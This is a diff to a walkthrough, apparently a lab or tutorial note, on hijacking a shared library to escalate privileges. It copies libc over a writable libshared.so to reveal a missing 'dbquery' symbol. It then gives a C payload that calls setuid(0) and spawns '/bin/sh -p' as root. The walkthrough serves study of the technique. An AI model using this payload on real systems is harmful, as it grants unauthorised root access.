@@ -22,7 +22,28 @@ Next, we confirm if the path /development is writable by us, if the directory is
 
 We first find another library to replace this /development/libshared.so, this preferably should be another library.
 ```
+cp /development/libshared.so /development/libshared.so.bak #Creating a backup before destructive action
 cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so 
 ```
 
-Next, we run payroll, we should be bumped by a symbol lookup error ()
+Next, we run payroll, we should be bumped by a symbol lookup error (as the library we copied won't have the respective function needed):
+
+```
+./payroll 
+
+./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
+```
+
+We noticed that the dbquery function is missing, next, we write the following as payload, replace dbquery with actual function name when in use:
+```
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h>
+
+void dbquery() {
+    printf("Injection Incoming\n");
+    setuid(0);
+    printf("Spawning Shell...\n");
+    system("/bin/sh -p");
+} 
+```
